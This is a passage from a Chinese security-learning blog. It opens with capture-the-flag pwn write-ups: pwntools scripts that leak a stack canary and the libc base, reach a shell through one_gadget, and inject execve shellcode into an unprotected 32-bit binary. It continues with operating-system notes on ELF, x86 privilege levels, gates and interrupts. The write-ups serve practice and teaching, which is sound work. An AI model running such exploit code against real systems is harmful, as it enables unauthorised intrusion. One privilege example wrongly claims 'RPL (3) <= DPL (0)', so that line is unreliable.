&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(payload)p.recvuntil(&#x27;&gt;&gt; &#x27;)p.sendline(&#x27;2&#x27;)p.recvuntil(b&#x27;a&#x27;*(0x90-0x8)+b&#x27;\\n&#x27;)canary = u64(b&#x27;\\x00&#x27;+p.recv(7))log.info(&quot;canary:&quot;+hex(canary))#-------leak_libc------puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = 0x400908pop_rdi = 0x0000000000400a93p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)payload1 = b&#x27;a&#x27;*0x88+p64(canary)+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload1)p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]log.info(&quot;libc_base&quot;+hex(libc_base))#---------getshell-------p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)one_gadget = libc_base+0x45216payload2 = b&#x27;b&#x27;*0x88+p64(canary)+b&#x27;b&#x27;*0x8+p64(one_gadget)p.sendline(payload2)p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)p.interactive()\n\n这边用的one_gadget,正常的ROP也是没有问题的\n62 pwnable_startshellcode\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/62/pwn&#x27;    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX disabled    PIE:        No PIE (0x8048000)    Stripped:   No\n\n保护全关\nida看一下，汇编写的\npublic _start_start proc nearpush    esppush    offset _exitxor     eax, eaxxor     ebx, ebxxor     ecx, ecxxor     edx, edxpush    3A465443hpush    20656874hpush    20747261hpush    74732073hpush    2774654Chmov     ecx, esp        ; addrmov     dl, 14h         ; lenmov     bl, 1           ; fdmov     al, 4int     80h             ; LINUX - sys_writexor     ebx, ebxmov     dl, 3Ch ; &#x27;&lt;&#x27;mov     al, 3int     80h             ; LINUX -add     esp, 14hretn\n\n扔给ai分析一下，read那里可以读入60字节，但是栈只有20字节，可以溢出\n所以我们可以先给esp指的位置泄露出来，然后把那个地方写入shellcode并执行\nfrom pwn import *context.arch = &#x27;i386&#x27;#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25719)payload = b&#x27;a&#x27;*20+p32(0x08048087)# ida里可以看到，这里对应的是\tmov\t\tecx,espp.recvuntil(b&#x27;:&#x27;)p.send(payload)leak = u32(p.recv(4))shellcode = b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;#shellcode = asm(shellcraft.sh())payload2 = b&#x27;a&#x27;*20+p32(leak+20)+shellcodep.send(payload2)p.interactive()\n\n可以在这里找一些合适的shellcode\n63 gyctf_2020_borrowstack直接看这篇吧\n64 hitcontraining_heapcreator施工中\n65","categories":["wp"]},{"title":"操作系统学习笔记03-从初始内核到中断","url":"/2025/07/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-%E4%BB%8E%E5%88%9D%E5%A7%8B%E5%86%85%E6%A0%B8%E5%88%B0%E4%B8%AD%E6%96%AD/","content":"0x06 载入初始内核0x06 00 基础知识ELF文件\n每个文件都存在一个文件头，这个文件头里存放着包含这个文件的各种信息。\n目标文件既会参与程序连接又会参与程序执行。处于方便性和效率考虑，根据过程的不同，目标文件格式提供了有其内容的两种并行视图\n\n首先是ELF heafer部分\n#define EI_NIDENT   16typedef struct &#123;    unsigned char   e_ident[EI_NIDENT];\t    //Magic number（前4字节）；ELF文件内容如何解码等信息    ELF32_Half      e_type;    //描述了ELF文件的类型    ELF32_Half      e_machine;    //描述了文件面向的架构    ELF32_Word      e_version;    //描述了ELF文件的版本号    ELF32_Addr      e_entry;    //执行入口点，如果文件没有入口点，这个域保持0（4字节）    ELF32_Off       e_phoff;    //*program header table*的offset，如果没有PH,则这个值是0    ELF32_Off       e_shoff;    //section header table的offset,如果没有SH，则这个值是0    ELF32_Word      e_flags;    //特定于处理器的标志，Intel架构一般都是0    ELF32_Half      e_ehsize;    //ELF header的大小，32位的ELF是52字节，64位是64字节    ELF32_Half      e_phentsize;    //program header table中每个入口的大小    ELF32_Half      e_phnum;    //e_phentsize*e_phnum得到整个program header table的大小    ELF32_Half      e_shentsize;    //section header table中entry的大小，即每个section header占多少字节    ELF32_Half      e_shnum;    //同e_phnum    ELF32_Half      e_shstrndx;    //section header string table index. 包含了section header table中section name string table。如果没有section name string table,e_shstrndx的值是SHN_UNDEF&#125; Elf32_Ehdr;\n\n这里可以用readelf -h &lt;elffile&gt;来读取文件头，例如下图\n\n接下来是**程序头表（Program Header Table)**部分\ntypedef struct &#123;    ELF32_Word  p_type;    //表示该段的类型    ELF32_Off   p_offset;    //表示本段在文件中的偏移地址    ELF32_Addr  p_vaddr;    //表示本段正在虚拟内存中的起始地址    ELF32_Addr  p_paddr;    //仅用于与物理地址相关的系统中，因为System V忽略用户程序中所有的物理地址    ELF32_Word  p_filesz;    //表示本段在文件中的大小    ELF32_Word  p_memsz;    //表示本段子内存中的大小    ELF32_Word  p_flags;    //指明本段的标志类型    ELF32_Word  p_align;    //对齐方式&#125; Elf32_Phdr;\n\n同样的可以使用readelf -l &lt;file&gt;来读取程序头，如下\n\n0x06 01 实现初始内核略去了就\n0x07 特权级计算机里的一系列指令执行等操作都可以被认为是某个访问者来访问受访者。这里房屋内者和受访者都有属于自己的特权级，而特权级较低的访问者是不允许访问特权级较高的受访者。如下图，数字越小，特权级越高\n\n其中，操作系统位于最内环的0级特权，他控制硬件，掌控各种核心数据。系统程序分别位于1级特权和2级特权，运行在这两层的程序一般是虚拟机、驱动程序等系统服务。用户程序在最外层，为3级特权\nTSS即Task State Segment：任务状态段，它是每个任务都有的结构。其功能是任务切换和任务管理。结构如下：\n\nstruct TSS &#123;    uint32_t prev_tss;   // 前一个任务的 TSS 链接（用于嵌套任务）    uint32_t esp0;       // Ring 0 的堆栈指针（用户态切换到内核态时用）    uint32_t ss0;        // Ring 0 的堆栈段选择子    uint32_t esp1, ss1;  // Ring 1（不常用）    uint32_t esp2, ss2;  // Ring 2（不常用）    uint32_t cr3;        // 页目录基址（页表）    uint32_t eip;        // 程序计数器    uint32_t eflags;     // 状态寄存器    uint32_t eax, ecx, edx, ebx;    uint32_t esp, ebp, esi, edi;  // 通用寄存器    uint32_t es, cs, ss, ds, fs, gs; // 段寄存器    uint32_t ldt;         // LDT 段选择子    uint16_t trap;    uint16_t iomap_base;  // IO 权限位图起始偏移&#125;;\n\n上面的结构图告诉我们有三个栈顶esp0、esp1、esp2，分别对应3个特权级，用来保存相关的内容。而3号特权级栈，也即用户栈，它的切换是通过保存上下文来进行的\n进程&&任务：点击查看更多 \n              \n              进程是程序的一次执行实例，是操作系统进行资源分配和调度的基本单位拥有独立的地址空间拥有自己的代码段、数据段、堆、栈有用系统资源（文件描述符、内存、信号量等）每个进程都有一个唯一的PID任务是一个更加广义的术语，在不同上下文中含义不太一样上下文含义Linux内核任务 ≈ 一个执行单元，可能是进程或者线程x86架构指的是一个TSS表示的活动实体一般语境抽象的工作单元，比如某个需要执行的功能任务vs进程（Linux角度）比较项任务（Task）进程（Process）定义内核中的调度单元，使用 task_struct 表示程序的执行实例，使用 PID 区分范围包含进程和线程严格指拥有独立资源的执行体地址空间可共享（线程）或不共享（进程）拥有独立地址空间资源管理单位否（线程间共享资源）是（进程独立拥有资源）调度单位是是（本质上由 task_struct 支持）\n              \n            \n\n特权级在变化的时候，需要用到不同特权级下的栈，当处理器进入不同特权级时，他会自动在TSS中找同特权级的栈\n\n  \n    \n      举个例子（从用户态中断进入内核态）\n\n    \n    \n      假设现在的情况是：Ring3遭遇触发中断,则变化过程如下：\nflowchart \n  A[CPU检测特权级变化R3->0]:::step1\n  B[从当前 GDT 中 TSS 描述符找到 TSS 地址]:::step2\n  C[加载 TSS 中的 ESP0 和 SS0]:::step3\n  D[切换堆栈为内核栈，并在其上压入旧的用户态 SS、ESP、EFLAGS、CS、EIP]:::step4\n  E[跳转到中断处理程序执行]:::step5\n  F[内核结束后通过 IRET 返回用户态]:::step6\n\n  A --> B\n  B --> C\n  C --> D\n  D --> E\n  E --> F\n\n  classDef step1 fill:#FF6347,stroke:#D32F2F,stroke-width:2px,color:white;\n  classDef step2 fill:#FFD700,stroke:#F57C00,stroke-width:2px,color:white;\n  classDef step3 fill:#1E90FF,stroke:#1976D2,stroke-width:2px,color:white;\n  classDef step4 fill:#8A2BE2,stroke:#6A1B9A,stroke-width:2px,color:white;\n  classDef step5 fill:#FF4500,stroke:#FF8C00,stroke-width:2px,color:white;\n  classDef step6 fill:#228B22,stroke:#388E3C,stroke-width:2px,color:white;\n\n\n    \n  \n\n当然了，TSS和GDT一样是个数据结构，也自然如GDT一样需要相关的找到他的数据结构，GDT有GDTR，TSS有TR寄存器\nCPL和DPLPL（Privilege Level）也就是CPU用来记录特权级高低的标识\nRPL(Requestor Privilege Level)也就是请求特权级。它表示请求该段的程序的特权级，通常由段选择符中的特权级指定的\nCPL(Current Privilege Level)也就是当前特权级。CPL的值由当前执行代码段的段选择符的特权级决定，通常会影响CPU如何执行指令和响应外部事件\n DPL(Descriptor Privilege Level)也就是描述符特权级。每个段都有一个描述符，这些描述符包含了访问该段时所需的特权级要求。DPL的值决定了该段能否被具有相应CPL的程序访问。\n\n例如：某个段的DPL值为1，那么只有CPL&lt;&#x3D;1的程序才可以访问该段\n\n总而言之，CPL 代表当前正在执行的代码的特权级，而 DPL 代表段的特权级。通过这两个机制，操作系统可以有效地隔离不同权限级别的代码和数据，确保系统的安全性\n\n  \n    \n      三者的访问规则&amp;&amp;例子\n\n    \n    \n      \n有效访问：当程序要访问一个段时，必须满足以下两个条件：\n\nCPL &lt;&#x3D; DPL：即程序的当前特权级（CPL）不能高于段描述符的特权级（DPL），否则会导致特权级错误。\n\nRPL &lt;&#x3D; DPL：即请求特权级（RPL）也不能高于段的描述符要求的特权级（DPL），否则也会触发错误。\n\n\n\n限制访问：如果 CPL &gt; DPL 或 RPL &gt; DPL，则访问该段会失败，触发特权错误（如 #GP 异常）。\n\n\n\n举个例子\n假设有一个段描述符，其 DPL 为 0（内核模式）。有两个程序，它们的 CPL 和 RPL 如下：\n\n程序 A 的 CPL 为 0（内核模式），RPL 为 3（用户模式），请求访问该段。\n\n程序 B 的 CPL 为 3（用户模式），RPL 为 2（中间权限），请求访问该段。\n在这种情况下：\n\n程序 A 可以访问该段，因为 CPL (0) &lt;&#x3D; DPL (0) 且 RPL (3) &lt;&#x3D; DPL (0)。\n程序 B 无法访问该段，因为 CPL (3) &gt; DPL (0)，即它的当前特权级低于该段描述符所要求的特权级。\n\n\n\n\n    \n  \n\n但是这样存在一个问题：某一特权级的代码段，低它一级的没法运行，高它一级的不让运行。因此受访者为代码段的时候，一般情况下，只能平级访问\n但这样会导致另一个问题，我们低特权级下的指令真的想要用高特权级的指令，怎么办呢？于是给出了一致性代码这一东西\n\n  \n    \n      一致性代码\n\n    \n    \n      一致性代码段也称为依从代码段。用来实现从低特权级的代码向高特权级的代码转移。\n一致性代码段是指如果自己是转移后的目标段，自己的特权级（DLR）一定要大于等于转移前的CPL,即数值上CPL&gt;&#x3D;DPL &#x2F; 一致性代码段的DPL是权限的上限，任何在此权限之下的特权级都可以转到此代码段上执行\n一致性代码段的一大特点是转移后的特权级不与自己的特权级（DPL）为主，而是与转移前的低特权级一致，听从、依从转移前的低特权级。也就是说，处理器遇到目标端为一致性代码段的时候，并不会将CPL用该目标段的DPL替换\n因此这一代码的转移并没有提升特权级，只是在特权级更高的地方执行指令，并未产生因特权级升高而产生潜在危险\n\n    \n  \n\n但我们总不能一直这样运行，因为有的代码他不会标识为一致性代码，所以我们就需要其它机制来使得我们向高特权级转化\n门、调用门、RPL序首先了解一下门结构：它是记录一段程序起始地址的描述符，用来描述一段程序，进入这个门结构之后，处理器就可以转移到更高的特权上\n\n\n\n\n\n\n\n任务门描述符\n\n\n\n\n\n中断门描述符\n\n\n\n\n\n陷阱门描述符\n\n\n\n\n\n调用门描述符\n\n\n除任务门之外，他们与段描述符最大的不同在于：这些门都是对应到一段例程之中，即对应一段函数，而不是像段描述符一样对应的是一片内存区域。由于任何程序都属于某个内存段，所以程序确切的地址必须用“代码段选择子+段内偏移量”来描述。可见门描述符基于段描述符，所以门描述符中记录的是选择子和偏移量的原因\n任务门描述符可以放在GDT、LDT和IDT（中断描述表）中，调用门可以位于GDT、LDT中，中断门和陷阱门仅位于IDT中\n此外，由于任务门、调用门都直接位于描述符表中，所以这两个门都可以直接用call、jmp指令直接使用；陷阱门和中断门位于IDT中，所以这两个门只能由中断信号触发\n下面分别说下每个门的适用范围：\n\n调用门：call和jmp指令后接调用门选择子为参数实现系统调用，call指令使用调用门可以实现向高特权级代码转移，jmp使用调用门只能实现平级代码转移\n中断门：以int指令主动发中断的形式实现从低特权级到高特权级转移\n陷阱门：以int3指令主动发中的的形式实现低特权级向高特权级转移，这一般是编译器在调式时用\n任务门：任务以状态段TSS为单位，用来实现任务切换，它可以借助中断或指令发起。当中断发生时，如果对应的中断向量号是任务门，则会发起任务切换。也可以像调用门那样，用call或jmp指令后接任务门的选择子或任务TSS的选择子\n\n\n\n\n\n\n\n\n为什么可以使用门的结构进入高特权级，这个图太形象了\n\n\n门的特权级是一定要低于我们访问者的特权级的，这样才能保证我们能过调用门，而受访者的特权级一定得高于访问者者，不然没有意义了\n调用门的内部执行结构：点击查看更多 \n              \n              从调用门选择子到或许到内核代码的地址，共经历了5个步骤。用户程序调用调用门选择子在用户程序中有一句代码call 调用门选择子,call指令可以使用调用门，参数就是调用门的选择子，该选择子指向GDT或LDT中的某个门描述符。处理器查找门描述符地址处理器用门描述符选择子的高13位（索引位）乘以8作为该描述符在GDT中的偏移量，再加上寄存器GDTR中的GDT基地址，最终找到了门描述符的地址，它位于GDT中从0起的第3个描述符位置。获取内核例程地址在该描述符中记录的是内核例程的地址。我们知道，在保护模式下描述某个内存地址是离不开选择子和偏移量的，所以，门描述符中记录的是内核例程所在代码段的选择子及偏移量处理器查找内核代码段描述符地址处理器用代码段选择子的高13位索引值乘以8，加上GDT基址，得到内核代码段描述符地址最终获取内核例程起始地址用已经得到的内核代码段描述符地址，我们就可以最终得到内核例程的起始地址\n              \n            \n\n调用门的过程保护调用门涉及两个特权级，先是转移前的低特权级，这是程序调用“调用门”时的CPL；再就是转移后的目标特权级，这是由门描述符中选择子对应的目标代码段的DPL决定的。\n接下来，假设用户进程要调用某个调用门，该门描述符中的参数个数是2，也就是说用户进程需要为该调用门提供2个参数才行。调用前的当前特权级为3，调用后的新特权级为0，所以调用门转移前用的是3特权级栈，调用后用的是0特权级栈\n现在为此特权门提供2个参数，这是在使用调用门前完成的，目前是在3特权级，所以要在特权级栈中压入参数，分别是参数1和参数2\n\n接下来确定新栈，这一步中我们根据门描述符中所寻找到的选择子来确定目的代码段的DPL值，这将作为我们日后的CPL值存在，同时我们会通过TSS来确定相对应的DPL站地址，也就是栈段选择子SS和栈指针ESP，这里记作SS_NEW、ESP_NEW\n如果转移后的代码段特权提升，我们就需要换到新栈，此时旧段选择子我们记为SS_OLD、ESP_OLD,由于我们这俩值需要保存到新栈中，这是为了方便日后使用retf等指令进行返回旧栈，此时我们需要将SS_OLD、ESP_OLD放到某个地方进行保存，例如其他的一些寄存器，然后当我们将SS_NEW和ESP_NEW载入到SS和ESP寄存器后，咱们再将他俩压入新栈就行了\n然后再将用户栈中保存的参数压入新栈\n由于调用门描述符中记录的是某个段选择子和偏移，所以此时我们的cs寄存器需要用这个选择子重新加载，所以我们需要将旧的CS和EIP保存到栈上，然后重新加载两个寄存器\n\n之后就是按照CS：EIP指示来运行内核例程从而实现特权级从3到0.\n但是总归是要回到原本的特权级，这里就是高特权级到低特权级了——retf指令：\n\n首先进行检查，检查之前栈中保存的旧CS选择子，判断其中的RPL，来决定是否需要进行权限变换\n然后弹出CS_OLD和EIP_OLD,目前为止ESP就会指向最后压的那个参数\n此时我们需要跳过参数，所以得到将ESP_NEW的值加上一定偏移，使得他刚好指向ESP_OLD\n若第一步中确定需要进行权限变换，此时再次pop两次，这样就恢复了之前的SS和ESP了\n\n\n书中作者举了一个相当生动形象的例子：\n不知道大伙儿学车了没有，报考驾校也要有个年龄限制，即使考 C本B本也要分年龄的。假如某个小学生A（用户进程）特别喜欢开车，他就是想考个驾照，可驾校的门卫（调用门〉一看他年龄太小都不让他进门，连填写报名登记表的机会都没有，怎么办？于是他就求他的长辈B（内核〉帮他去报名，长辈的年龄肯定够了，门卫对他放行，他来到驾校招生办公室后，对招生人员说要帮别人报名。人家招生人员对B说，好吧，帮别人代报名需要出示对方的身份证（RPL)，于是长辈B就把小学生A的身份证（现在小孩子就可以申请身份证，只是年龄越小有效期越短，因为小孩子长得快嘛）拿出来了，招生人员一看，年纪这么小啊，不到法制学车年纪呢，拒绝接收。这时候驾校招生人员的安全意识开始泛滥了，以纵容小孩子危险驾驶为名把长辈B批评了一顿（引发异常）\n\n0x08 实现打印函数这一段更多的是实操相关，没什么值得记录的知识点\n0x09 实现中断机制基础知识中断是计算机系统中的一种机制，用于打断正在执行的程序流程，以便处理更紧急或更高优先级的事件。和特权模式的切换息息相关\n中断按照来源一般分为两种类型：外部中断和内部中断\n外部中断\nCPU为了接受外部设备的中断信号请求，设置了两条信号线INTR、NMI。\n其中INTR收到的信号都是不影响系统运行的，可以随时处理，甚至可以不处理，因为它不影响CPU的运行；而只要从NMI引脚收到的中断，那必须要处理，因为这个是灾难性错误\n可屏蔽中断\n这指的是可以通过软件设置来屏蔽或允许的外部中断请求。在中断控制器中，CPU可以选择暂时忽略被这类中断，直至它准备好接受。\n在x86架构中，是否响应可屏蔽中断由eflags寄存器的IF位将所有这些外部设备的中断屏蔽\n不可屏蔽中断\n他是由NMI线传递的中断信号，只要这里传递了中断，计算机就说明遭到了严重的问题，必须立刻处理。此时上述eflags寄存器的IF位对他也毫无影响\n内部中断内部中断又可划分为软中断和异常\n软中断\n也就是软件发起的中断，它是操作系统或应用程序通过指令或者系统调用发出的中断信号，通常用于请求操作系统执行某些特权操作，如文件操作、进程调度、内存管理等。\n异常\n异常是程序运行时出现的错误，他同样不受eflags寄存器中的标志位影响（不可屏蔽）。大致分为下面3种\n\nFault：故障，可修复，如缺页异常\nTrap：陷阱，自己想陷入中断，所以中断返回后执行下一条指令\nAbort：终止，无法修复，操作系统为了自保，只能把该程序从进程表移除\n\n中断描述表是操作系统用于处理和管理中断的一种数据结构，它存储了中断服务例程地址，以及中断处理的相关信息。\n其中不止有中断描述符，还有任务门描述符和陷阱门描述符，且这些描述符均指向了一段程序\n\n任务门：配合TSS使用实现特权级切换，可以存放在GDT、LDT、IDT中，描述符中任务门的tyoe字段二进制为0101\n中断门：包含中断处理程序所在段的段选择子以及偏移，当通过此方式进入中断之后，eflags寄存器的IF位自动置0，也就是关中断，防止中断嵌套\n陷阱门：类似于中断门，区别就是IF位不会置0，只允许放在IDT中.\n调用门：提供用户进程进入特权0级，其DPL为3，只能用call和jmp指令调用，可以安装在GDT和LDT中。\n\n同理于GDT，我们需要一个寄存器来存放IDT的物理地址，这个寄存器就是IDTR\ntypedef struct &#123;    uint16_t limit;  // IDT 的大小（16 位）    uint32_t base;   // IDT 的基址（32 位）&#125; IDTR;// 64 位模式下表示 IDTR 的结构体typedef struct &#123;    uint16_t limit;  // IDT 的大小（16 位）    uint32_t base_low;   // 基址的低 32 位    uint32_t base_high;  // 基址的高 32 位&#125; IDTR;\n\n中断处理过程及保护中断过程分为CPU外和CPU内两个部分。\n\nCPU外：外部设备的1中断由中断代理芯片接收，处理后将该中断的中断向量号发送到CPU\nCPU内：CPU执行该中断向量号对应的中断处理程序\n\n先讨论处理器内部的内容\n\n处理器根据中断向量号定位中断门描述符\n\n处理器进行特权级检查\n由于中断是通过中断向量号通知到处理器的，中断向量号只是个整数，其中并不包含RPL，所以在对由中断引起的特权级转移做特权级检查中不会涉及RPL。中断门的特权级检查同调用门类似，对于软件主动发起的软中断，当前特权级CPL必须在门描述符和目标代码段DPL之间\n\n若是由软中断int n,int3, into引发的中断，这些是由用户自主发起的，所以处理器要检查当前特权级和门描述符DPL，这是检查进门的特权下限，乳山市检查通过，也就是CPL特权级是高于门DPL的，那么将进入下一步“门框”的检查，否则处理器将会报出异常\n这一步检查特权级的上限“门框”，处理器要检查当前特权级CPL和门描述符中所记录选择子对应的目标代码段DPL，若CPL特权级小于目标代码段的DPL，则检查通过哦，否则处理器引发异常\n若中断是由外部设备和异常引起的，则只检查CPL和目标代码段的DPL，若CPL小于目标代码段特权，则检查通过，否则处理器引发异常\n\n\n执行中断处理程序\n特权级检查通过后，将门描述符目标代码段选择子加载到代码段寄存器cs中，把嗯描述符中的偏移地址加载到EIP中，然后执行中断处理程序\n\n\n\n中断发生后，eflags中的NT位和TF位会被置零，若中断对应的是中断门，则在进入中断门后eflags的IF会自动置0以此来防止中断嵌套。\n处理器提供了一个修改IF位的指令：cli和sti。其中cli指令使得IF位为0，sti指令使得IF为1。分别称之为关中断和开中断\nIF位只能限制外部设备中断，而对其它影响系统正常运行的中断都无效。\nTF（Trap Flag），陷阱标志位，这用在调式环境中，当TF为0表示禁止单步执行\nNT(Nest Task Flag),任务嵌套位，用来标记任务嵌套调用情况。\n\n  \n    \n      任务嵌套\n\n    \n    \n      任务嵌套调用就是指CPU挂起当前的任务转而去执行另一个任务，待到该任务执行完再回去执行之前的任务。\nCPU之所以可以如此运行是因为他会执行以下操作：\n\n将旧任务的TSS段选择子写到新任务TSS中的“上一个任务TSS的指针”字段中\n将新任务eflags寄存器中NT置为1，表示新任务之所以能够执行是因为有别的任务调用了他\n\n而CPU从新任务返回到旧任务是通过iret指令，他又两个功能，一个是中断返回，一个是返回旧任务，所以这里就需要用到NT位，因为执行iret的时候会去检查NT位的值，若为1则说明当前任务是嵌套执行的，若为0则说明是在中断处理环境下，于是执行正常的中断退出流程\n\n    \n  \n\n中断压栈当中断发生时，处理器收到一个中断向量，根据改中断向量号在IDT中的偏移，然后找到对应的门然后通过其中的选择子，然后将该选择子移入CS中，再将门描述符中的偏移字段移入EIP。这时由于CS和EIP会被刷新，所以处理器会将被中断的程序的CS和EIP保存到当前中断处理程序使用的栈当中。但由于中断在任何特权级下都有可能发生，所以中断处理程序使用的栈不确定，这就导致我们除了保存CS、EIP外还需要保存EFLAGS；如果涉及到特权级变化，还要压入SS和ESP寄存器。\n寄存器入栈情况及其顺序\n\n\n当处理器通过中断向量找到对应的中断描述符后，比较CPL和中断门描述符中选择子对应目标代码段的DPL对比，若发现向高特权级转移，则需要切换到高特权级的栈，这也意味着当我们执行完中断处理程序后需要恢复旧栈才行。因此处理器先临时保存旧SS和ESP值，记作SS_old和ESP_old，然后在TSS中寻找到对应目标代码段同特权级的栈加载到寄存器SS和ESP中，记作SS_new和ESP_new，再将临时保存的SS_old和ESP_old压栈备份\n\n在新栈中压入EFLAGS寄存器\n\n因为要切换到目标代码段，对于这种段间转移，要将CS和EIP保存到当前栈中备份，记作CS_old和EIP_old，用于在中断结束后恢复被中断的进程\n\n某些异常会爆出错误码，这个错误是用于报告异常是在哪个段上发生的，也就是发生异常的位置，所以错误码中包含选择子等信息，他一般紧跟EIP后入栈，记为ERROR_CODE\n\n\n处理器执行完中断处理程序后需要返回到被中断进程，也就是使用iret指令进行弹栈，这里需要保证上述顺序，如果说有中断错误码且处理器并不知道，这就需要我们手动将其跳过，也就是说当我们准备用iret指令返回时，当前栈指针必须得指向栈中备份的EIP_old所在的位置\n可编程中断控制器8259A这个控制器比较古老了，现代中断控制器基本都是APIC类了,这里简单看一下工作流程就行\nflowchart TD\n    %% 外设部分\n    subgraph 外设\n        A[\"外设发出中断信号并发送至8259A对应IRQ接口\"]\n    end\n\n    %% 8259A内部处理\n    subgraph 8259A处理\n        B1{\"检查IMR对应位\"}\n        B2[\"若屏蔽，丢弃\"]\n        B3[\"若未屏蔽，置IRR对应bit=1，等待处理\"]\n        B4[\"优先级解析选最高IRQ，发中断信号给CPU\"]\n        B5[\"CPU响应中断（INTA），ISR置位，IRR清零\"]\n        B6[\"CPU再次请求中断向量，8259A发送给CPU\"]\n    end\n\n    %% CPU处理\n    subgraph CPU处理\n        C1[\"CPU进入中断处理程序\"]\n        C2{\"EOI通知模式\"}\n        C3[\"手动模式：CPU发送EOI，ISR清零\"]\n        C4[\"自动模式：第二次INTA自动清零ISR\"]\n    end\n\n    %% 流程连接\n    A --> B1\n    B1 -- 屏蔽 --> B2\n    B1 -- 未屏蔽 --> B3 --> B4 --> B5 --> B6 --> C1 --> C2\n    C2 -- 手动 --> C3\n    C2 -- 自动 --> C4\n\n    %% 样式定义\n    classDef ext fill:#fef7d7,stroke:#f5d300,stroke-width:2px,color:#5a5a00;\n    classDef pic fill:#d8f0ff,stroke:#0c87c4,stroke-width:2px,color:#034a6d;\n    classDef cpu fill:#fde3e1,stroke:#d94a4a,stroke-width:2px,color:#660000;\n    classDef decision fill:#fff0b8,stroke:#e1a800,stroke-width:2px,color:#6b4b00,font-weight:bold;\n\n    %% 应用样式\n    class A ext;\n    class B1,B2,B3,B4,B5,B6 pic;\n    class C1,C3,C4 cpu;\n    class C2 decision;\n\nflowchart TB\n\n%% 外设输入\nsubgraph \"外设中断输入\"\n    IRQ0[IRQ0]\n    IRQ1[IRQ1]\n    IRQ2[IRQ2]\n    IRQ3[IRQ3]\n    IRQ4[IRQ4]\n    IRQ5[IRQ5]\n    IRQ6[IRQ6]\n    IRQ7[IRQ7]\nend\n\nIRQ0 --> IRR\nIRQ1 --> IRR\nIRQ2 --> IRR\nIRQ3 --> IRR\nIRQ4 --> IRR\nIRQ5 --> IRR\nIRQ6 --> IRR\nIRQ7 --> IRR\n\n%% 主结构\nsubgraph \"8259A 主结构\"\n    IRR[\"🟡 IRR中断请求寄存器\"]\n    Priority[\"🔼 优先级解析器\"]\n    GateCtrl[\"🟩 中断门控制逻辑\"]\n    ISR[\"🔴 ISR中断服务寄存器\"]\n    IMR[\"⚪ IMR中断屏蔽寄存器\"]\n\n    IRR --> Priority\n    Priority --> GateCtrl\n    GateCtrl --> ISR\n    IMR --> GateCtrl\nend\n\nISR --> INT[\"➡️ 发出中断信号INT 向 CPU\"]\n\n%% CPU 接口\nsubgraph \"CPU 接口\"\n    INT --> CPU[\"🧠 CPU 接收中断\"]\n    CPU --> EOI[发送 EOI]\n    EOI --> ISR\nend\n\n%% 控制配置\nsubgraph \"控制与配置\"\n    CMD[控制命令ICW/OCW]\n    CMD --> IRR\n    CMD --> IMR\n    CMD --> ISR\nend\n\n%% 使用 class 定义样式\nclassDef yellow fill:#fff3b0,stroke:#c9a600,stroke-width:2px;\nclassDef red fill:#ffd6d6,stroke:#d22b2b,stroke-width:2px;\nclassDef green fill:#ccffd8,stroke:#339933,stroke-width:2px;\nclassDef blue fill:#d0f0ff,stroke:#107dac,stroke-width:2px;\nclassDef gray fill:#f0f0f0,stroke:#999,stroke-width:2px;\nclassDef purple fill:#f0e5ff,stroke:#9457eb,stroke-width:2px;\nclassDef signal fill:#fef3c7,stroke:#facc15,stroke-width:2px;\nclassDef control fill:#fde2ff,stroke:#d946ef,stroke-width:2px;\n\n%% 应用样式\nclass IRR yellow;\nclass ISR red;\nclass GateCtrl green;\nclass IMR blue;\nclass Priority gray;\nclass CPU purple;\nclass EOI blue;\nclass INT signal;\nclass CMD control;\n\n%% 默认线\nlinkStyle default stroke:#444,stroke-width:1.5px;\n\n总结1. ELF文件格式ELF（Executable and Linkable Format）是Unix&#x2F;Linux系统的标准可执行文件格式，包含程序加载和执行所需的所有信息。\nELF文件结构：\ngraph TD\n    A[ELF Header] --> B[Program Header Table]\n    A --> C[Sections]\n    A --> D[Section Header Table]\n    B --> E[Segments]\n    C --> F[.text代码段]\n    C --> G[.data数据段]\n    C --> H[.rodata只读数据]\n\n关键数据结构：\n\nELF Header（Elf32_Ehdr）：\n\n魔数（e_ident）\n入口地址（e_entry）\n程序头表偏移（e_phoff）\n节头表偏移（e_shoff）\n使用命令：readelf -h &lt;file&gt;\n\n\nProgram Header（Elf32_Phdr）：\n\n段类型（p_type）\n文件偏移（p_offset）\n虚拟地址（p_vaddr）\n文件大小（p_filesz）\n内存大小（p_memsz）\n使用命令：readelf -l &lt;file&gt;\n\n\n\n\n2. 特权级机制x86架构通过特权级（0-3级）实现硬件级安全隔离：\ngraph LR\n    A[Ring 0] -->|OS内核| B[最高权限]\n    C[Ring 1-2] -->|驱动/虚拟机| D[系统服务]\n    E[Ring 3] -->|应用程序| F[最低权限]\n\n关键机制：\n\nTSS（任务状态段）：\n\n存储任务上下文（寄存器&#x2F;栈指针）\n特权级切换时自动更新esp0/ss0\n\nstruct TSS &#123;    uint32_t esp0;   // Ring 0栈指针    uint32_t ss0;    // Ring 0栈段    uint32_t cr3;    // 页目录基址    //... 其他寄存器&#125;;\n\n特权级检查规则：\n\n数据访问：CPL ≤ DPL 且 RPL ≤ DPL\n代码跳转：\n非一致代码：CPL &#x3D;&#x3D; DPL\n一致代码：CPL ≥ 